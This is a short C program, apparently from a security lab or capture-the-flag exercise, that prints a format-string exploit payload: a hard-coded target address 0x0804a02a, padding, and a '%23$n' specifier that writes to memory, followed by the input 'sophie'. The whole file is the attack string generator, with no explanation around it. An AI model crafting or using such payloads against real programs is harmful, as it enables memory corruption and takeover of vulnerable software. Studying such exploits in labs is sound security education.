#include <stdio.h>
#include <string.h>

//0x0804a02a
char attackString[] = "\x2a\xa0\x04\x08                                                             %23$n\nsophie\n\n";
int main(){
	char *p = attackString;
	for(int i = 0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
		
	}
	return 0;
}

